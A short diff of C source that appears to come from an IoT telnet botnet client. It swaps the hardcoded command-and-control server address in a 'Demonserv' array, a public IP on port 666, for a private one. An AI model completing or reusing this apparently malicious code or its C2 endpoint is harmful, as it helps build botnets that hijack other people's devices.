@@ -30,7 +30,7 @@
 #define OPT_SGA   3
 #define BUFFER_SIZE 512
 /////////////////////////////////////////
-unsigned char *Demonserv[] = {"157.245.209.146:666"};
+unsigned char *Demonserv[] = {"10.158.0.2:666"};
 /////////////////////////////////////////
 int initConnection();
 void makeRandomStr(unsigned char *buf, int length);
